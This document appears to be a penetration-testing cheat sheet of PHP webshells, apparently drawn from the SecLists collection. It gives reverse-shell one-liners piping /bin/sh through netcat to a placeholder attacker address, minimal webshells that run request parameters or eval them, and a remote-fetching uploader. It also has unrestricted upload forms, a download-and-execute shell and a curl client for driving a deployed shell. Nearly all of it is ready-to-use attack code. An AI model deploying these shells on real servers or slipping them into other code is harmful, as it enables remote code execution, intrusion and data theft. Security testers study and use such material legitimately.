# PHP

## 01 - Simple Webshells

Quick and dirty command execution.

```php
<?php
exec('rm /tmp/j; mkfifo /tmp/j; cat /tmp/j | /bin/sh -i 2>&1 | nc <attacker_IP> <attacker_PORT> > /tmp/j');
passthru('rm /tmp/k; mkfifo /tmp/k; cat /tmp/k | /bin/sh -i 2>&1 | nc <attacker_IP> <attacker_PORT> > /tmp/k');
shell_exec('rm /tmp/l; mkfifo /tmp/l; cat /tmp/l | /bin/sh -i 2>&1 | nc <attacker_IP> <attacker_PORT> > /tmp/l');
system('rm /tmp/m; mkfifo /tmp/m; cat /tmp/m | /bin/sh -i 2>&1 | nc <attacker_IP> <attacker_PORT> > /tmp/m');
?>
```

Tiny webshell.

```php
<?=`$_GET[0]`?>
```

Basic webshell with HTML input form.

```php
<html>
    <body>
        <form method="get" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
            <input type="text" name="cmd" autofocus id="cmd" size="80">
            <input type="submit" value="Execute">
        </form>
        <pre>
            <?php
            if(isset($_GET["cmd"])) {
                echo system($_GET["cmd"] . " 2&<1");          
            }
            ?>
        </pre>
    </body>
</html>
```

File upload and a simple webshell.

```php
if (isset($_REQUEST['fupload'])) {
  file_put_contents($_REQUEST['fupload'], file_get_contents("http://10.0.0.1:1234/" . $_REQUEST['fupload']));
};

if (isset($_REQUEST['fexec'])) {
  echo shell_exec($_REQUEST['fexec']);
};
```

## 02 - Uploader

A quick simple php upload form.

```php
<form enctype="multipart/form-data" action="" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="512000" />
Send this file: <input name="userfile" type="file" />
<input type="submit" value="Send File" />  </form>
```

one liner upload form.

```php
<FORM ENCTYPE="multipart/form-data" ACTION=<?php echo "http://" . $_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"]; ?> METHOD=POST>Send this file: <INPUT NAME="userfile" TYPE="file"><INPUT TYPE="submit" VALUE="Send"></FORM><?php move_uploaded_file($_FILES["userfile"]["tmp_name"], $_FILES["userfile"]["name"]); ?>
```

Simple PHP uploader

```php
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>File Upload</title>
    </head>
    <body>
        <h2>File Upload</h2>
        <form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST" enctype="multipart/form-data">
            <input type="file" name="fileToUpload" id="fileToUpload">
            <input type="submit" value="Upload" name="submit">
        </form>

        <?php
        if (isset($_POST['submit'])) {
            if (!empty($_FILES['fileToUpload']['name'])) {
                $targetDir = './'; // Upload to the same directory as the PHP script
                $targetFile = $targetDir . basename($_FILES['fileToUpload']['name']);

                if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $targetFile)) {
                    echo "File uploaded successfully.";
                } else {
                    echo "Sorry, there was an error uploading your file.";
                }
            } else {
                echo "Please choose a file to upload.";
            }
        }
        ?>
    </body>
</html>
```

One liner PHP code.

```php
<?php if(isset($_POST['submit'])){$t='./';$f=$t.basename($_FILES['fileToUpload']['name']);if(move_uploaded_file($_FILES['fileToUpload']['tmp_name'],$f))echo"File uploaded successfully.";else echo"Sorry, there was an error uploading your file.";}?> <!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>File Upload</title></head><body><h2>File Upload</h2><form action="<?=$_SERVER['PHP_SELF']?>" method="POST" enctype="multipart/form-data"><input type="file" name="fileToUpload" id="fileToUpload"><input type="submit" value="Upload" name="submit"></form></body></html>
```

PHP uploader with table view

```php
<!-- https://community.netwitness.com/t5/netwitness-community-blog/from-sql-injection-to-webshell/ba-p/521012 -->
<!DOCTYPE html>
<html>
	<head>
	    <title>File Upload</title>
	</head>
	<body>
	    <form enctype="multipart/form-data" method="POST">
	        File: <input name="file" type="file"><br>
	        <input type="submit" value="Upload">
	    </form>
	
	    <?php
	    if (!empty($_FILES["file"])) {
	        $file = $_FILES["file"];
	        if ($file["error"] > 0) {
	            echo "Error: {$file['error']}<br>";
	        } else {
	            echo "Stored file: {$file['name']}<br>Size: " . ($file["size"] / 1024) . " kB<br>";
	            move_uploaded_file($file["tmp_name"], $file["name"]);
	        }
	    }
	
	    $dirArray = array_filter(scandir("."), function($entry) { return $entry[0] !== "."; });
	    $indexCount = count($dirArray);
	    echo "$indexCount files<br><table border=1 cellpadding=5 cellspacing=0 class=whitelinks><tr><th>Filename</th><th>Filetype</th><th>Filesize</th></tr>";
	
	    foreach($dirArray as $entry) {
	        echo "<tr><td><a href=\"$entry\">$entry</a></td><td>" . filetype($entry) . "</td><td>" . filesize($entry) . "</td></tr>";
	    }
	
	    echo "</table>";
	    ?>
	</body>
</html>
```

One liner PHP code

```php
<!DOCTYPE html><html><head><title>File Upload</title></head><body><form enctype="multipart/form-data" method="POST">File: <input name="file" type="file"><br><input type="submit" value="Upload"></form><?php if (!empty($_FILES["file"])) {$file = $_FILES["file"];if ($file["error"] > 0) {echo "Error: {$file['error']}<br>";} else {echo "Stored file: {$file['name']}<br>Size: " . ($file["size"] / 1024) . " kB<br>";move_uploaded_file($file["tmp_name"], $file["name"]);}$dirArray = array_filter(scandir("."), function($entry) { return $entry[0] !== "."; });$indexCount = count($dirArray);echo "$indexCount files<br><table border=1 cellpadding=5 cellspacing=0 class=whitelinks><tr><th>Filename</th><th>Filetype</th><th>Filesize</th></tr>";foreach($dirArray as $entry) {echo "<tr><td><a href=\"$entry\">$entry</a></td><td>" . filetype($entry) . "</td><td>" . filesize($entry) . "</td></tr>";}echo "</table>";?></body></html>
```

## 03 - Downloader

One liner.

```php
<?php fwrite(fopen($_GET[f], 'w'), file_get_contents($_GET[url])); ?>
```

## 04 - Download and Execute

```php
// ?url=http[s]://<IP>/payload.exe&cmd=payload.exe
<?php
	if (isset($_REQUEST['url'])) {
		file_put_contents($_REQUEST['url'], file_get_contents($_REQUEST['url']));
	};

	if (isset($_REQUEST['cmd'])) {
		echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
	};
?>
```

## 05 - Evaluate PHP Code

```php
<?php eval($_GET[evaluate]); ?>
```

## 06 - Interactive Command Shell

```bash
#!/bin/bash
URL="http://x.x.x.x:yyyy/cmd_shell.php"
CMD=`echo ${*} | sed s'/ /%20/g'`
CMD=`echo ${CMD} | sed s'/&/%26/g'`
CMD=`echo ${CMD} | sed s'/>/%3e/g'`
echo ${URL}?cmd=${CMD}
curl -s ${URL}?cmd=${CMD}
echo ""
```

To execute it.

```
$ ./execute_webshell.sh ls -la
```

---
## References

### Source Repositories

- [SecLists: Web-Shells](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells/PHP)